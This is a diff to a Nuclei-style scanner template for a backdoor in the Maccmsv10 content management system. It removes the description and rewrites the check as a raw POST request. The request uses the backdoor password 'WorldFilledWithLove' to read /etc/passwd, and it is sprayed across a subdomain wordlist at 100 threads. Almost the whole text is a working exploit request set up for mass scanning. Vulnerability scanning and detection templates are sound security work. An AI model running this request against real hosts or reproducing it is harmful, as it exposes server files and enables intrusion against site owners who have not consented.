@@ -3,17 +3,23 @@ info:
   name: Maccmsv10 Backdoor
   author: princechaddha
   severity: critical
-  description: A backdoor has been found in Maccmsv10, the backdoor is accessible via the '/index.php/bbs/index/download' endpoint and the special 'getpwd' parameter value of 'WorldFilledWithLove'.
   tags: maccmsv10,rce
 
-http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1"
-    body: "getpwd=WorldFilledWithLove"
-    headers:
-      Content-Type: application/x-www-form-urlencoded
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        POST /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1 HTTP/1.1
+        Host: {{Subdomains}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/x-www-form-urlencoded
+
+        getpwd=WorldFilledWithLove
     matchers-condition: and
     matchers:
       - type: word
